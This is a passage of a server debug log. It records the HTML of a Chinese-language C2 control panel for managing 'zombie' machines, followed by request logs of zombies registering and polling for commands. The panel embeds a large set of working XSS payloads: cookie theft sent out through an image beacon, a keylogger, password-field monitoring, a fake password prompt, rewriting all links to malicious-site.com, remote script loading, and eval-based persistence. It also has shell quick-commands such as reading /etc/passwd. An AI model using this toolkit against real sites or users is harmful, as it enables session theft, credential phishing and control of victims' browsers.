class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.cookie || &quot;無Cookie&quot;; })()\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var links = []; document.querySelectorAll(&quot;a&quot;).forEach(function(a){ links.push({text: a.innerText, href: a.href, target: a.target}); }); return JSON.stringify(links, null, 2); })()\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var info = { title: document.title, url: window.location.href, userAgent: navigator.userAgent, referrer: document.referrer, domain: document.domain }; return JSON.stringify(info, null, 2); })()\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var forms = []; document.querySelectorAll(&quot;form&quot;).forEach(function(f, i){ forms.push({ index: i+1, action: f.action, method: f.method, inputs: Array.from(f.querySelectorAll(&quot;input&quot;)).map(inp => ({name: inp.name, type: inp.type, value: inp.value})) }); }); return JSON.stringify(forms, null, 2); })()\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var inputs = []; document.querySelectorAll(&quot;input&quot;).forEach(function(inp){ inputs.push({name: inp.name, type: inp.type, value: inp.value, placeholder: inp.placeholder}); }); return JSON.stringify(inputs, null, 2); })()\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return JSON.stringify({ localStorage: Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage[key]; return obj; }, {}), sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage[key]; return obj; }, {}) }, null, 2); })()\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var fingerprint = { screen: screen.width + &quot;x&quot; + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(&quot;script&quot;); script.src = &quot;http://127.0.0.1:8964/api/control/xss_payload&quot;; document.head.appendChild(script); return &quot;遠程腳本載入中...&quot;; })()\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.documentElement.outerHTML.substring(0, 2000); })()\')">竊取頁面HTML</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var scripts = []; document.querySelectorAll(&quot;script&quot;).forEach(function(s){ scripts.push({src: s.src, content: s.innerHTML.substring(0, 200)}); }); return JSON.stringify(scripts, null, 2); })()\')">查看頁面腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var meta = []; document.querySelectorAll(&quot;meta&quot;).forEach(function(m){ meta.push({name: m.name, content: m.content, property: m.property}); }); return JSON.stringify(meta, null, 2); })()\')">查看Meta信息</button>\n\n                    <!-- 測試載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var result = { timestamp: new Date().toISOString(), url: window.location.href, title: document.title, userAgent: navigator.userAgent, cookies: document.cookie, domElements: document.querySelectorAll(&quot;*&quot;).length }; return &quot;=== 完整信息收集結果 ===\\\\n&quot; + JSON.stringify(result, null, 2); })()\')">完整信息收集</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n</body>\n\n\n</html>'
2025-06-26 22:56:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:38] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:56:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:38] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:56:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:38] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:56:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 22:56:40 | INFO     | control_route.py:187 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 22:56:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-26 22:56:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:40] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 22:56:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:56:41 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:56:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:56:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:56:42 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:56:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:42] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:56:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 22:56:43 | INFO     | control_route.py:187 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 22:56:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-26 22:56:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:43] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 22:56:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:56:45 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:56:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:56:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:56:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-26 22:56:46 | INFO     | control_route.py:138 | xss_payload() | 用戶請求XSS載荷文件
2025-06-26 22:56:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 4313 bytes [200 OK]>
2025-06-26 22:56:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:46] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-26 22:56:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:56:46 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-26 22:56:46 | INFO     | control_route.py:53 | add_message() | 創建新記錄，目標IP: 127.0.0.1
2025-06-26 22:56:46 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-26T14:56:46.669Z"},時間: 2025-06-26 22:56:46.677304
2025-06-26 22:56:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0045s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-26 22:56:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:46] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-26 22:56:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:56:46 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:56:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0010s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>控制消息</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" 